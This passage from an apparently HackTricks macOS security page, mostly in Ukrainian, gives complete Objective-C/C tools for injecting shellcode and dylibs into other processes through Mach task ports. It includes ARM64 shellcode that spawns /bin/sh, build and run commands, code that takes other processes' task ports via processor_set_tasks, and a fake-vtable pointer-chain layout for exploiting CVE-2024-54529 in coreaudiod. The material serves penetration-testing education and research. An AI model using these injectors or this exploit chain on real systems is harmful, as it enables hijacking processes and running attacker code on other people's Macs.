char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Щоб це працювало на iOS, потрібен entitlement `dynamic-codesigning`, щоб мати змогу зробити записувану пам'ять виконуваною.

### Dylib Injection in thread via Task port

У macOS **threads** можна маніпулювати через **Mach** або використовуючи **posix `pthread` api**. Thread, який ми згенерували в попередній ін'єкції, був створений за допомогою Mach api, тож **він не є posix compliant**.

Було можливо **inject a simple shellcode** для виконання команди, оскільки це **не вимагало роботи з posix** сумісними API, лише з Mach. **Більш складні ін'єкції** потребуватимуть, щоб **thread** також був **posix compliant**.

Тому, щоб **improve the thread**, він має викликати **`pthread_create_from_mach_thread`**, який **create a valid pthread**. Потім цей новий pthread може **call dlopen** щоб **load a dylib** з системи, тож замість написання нового shellcode для виконання різних дій можна завантажувати власні бібліотеки.

Приклади **example dylibs** можна знайти (наприклад той, що генерує лог, який потім можна прослухати):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Захоплення потоку через Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

У цій техніці захоплюється потік процесу:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Виявлення ін'єкції Task port

Під час виклику `task_for_pid` або `thread_create_*` збільшується лічильник у структурі task в ядрі, до якого можна отримати доступ з режиму користувача, викликавши task_info(task, TASK_EXTMOD_INFO, ...)

## Exception Ports

Коли в потоці виникає виняток, цей виняток надсилається на призначений exception port потоку. Якщо потік його не обробляє, то він надсилається на task exception ports. Якщо задача його не обробляє, то він надсилається на host port, яким керує launchd (де він буде підтверджений). Це називається exception triage.

Зауважте, що в кінці, якщо не обробити належним чином, звіт зрештою опиниться в обробці демона ReportCrash. Однак можливо, що інший потік у тій самій задачі обробить виняток — саме це роблять інструменти звітування про аварії, як-от `PLCreashReporter`.

## Other Objects

### Clock

Будь-який користувач може отримати інформацію про clock, однак щоб встановити час або змінити інші налаштування, потрібно бути root.

Щоб отримати інформацію, можна викликати функції з підсистеми `clock`, такі як: `clock_get_time`, `clock_get_attributtes` або `clock_alarm`\
Щоб змінити значення, можна використовувати підсистему `clock_priv` з функціями, такими як `clock_set_time` та `clock_set_attributes`

### Processors and Processor Set

API процесора дозволяють контролювати окремий логічний процесор, викликаючи функції на кшталт `processor_start`, `processor_exit`, `processor_info`, `processor_get_assignment`...

Більше того, API **processor set** надає спосіб групувати кілька процесорів у набір. Можна отримати набір процесорів за замовчуванням, викликавши **`processor_set_default`**.\
Ось деякі цікаві API для взаємодії з processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Return an array of send rights to all tasks inside the processor set
- `processor_set_threads`: Return an array of send rights to all threads inside the processor set
- `processor_set_stack_usage`
- `processor_set_info`

As mentioned in [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), in the past this allowed to bypass the previously mentioned protection to get task ports in other processes to control them by calling **`processor_set_tasks`** and getting a host port on every process.\
Нині для використання цієї функції потрібні права root, і вона захищена, тому ви зможете отримати ці порти лише для незахищених процесів.

You can try it with:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Maincpart fo the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; непрямий виклик через слот vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [*OS Internals, Volume I, User Mode, Jonathan Levin](https://www.amazon.com/MacOS-iOS-Internals-User-Mode/dp/099105556X)
- [https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
{{#include ../../../../banners/hacktricks-training.md}}
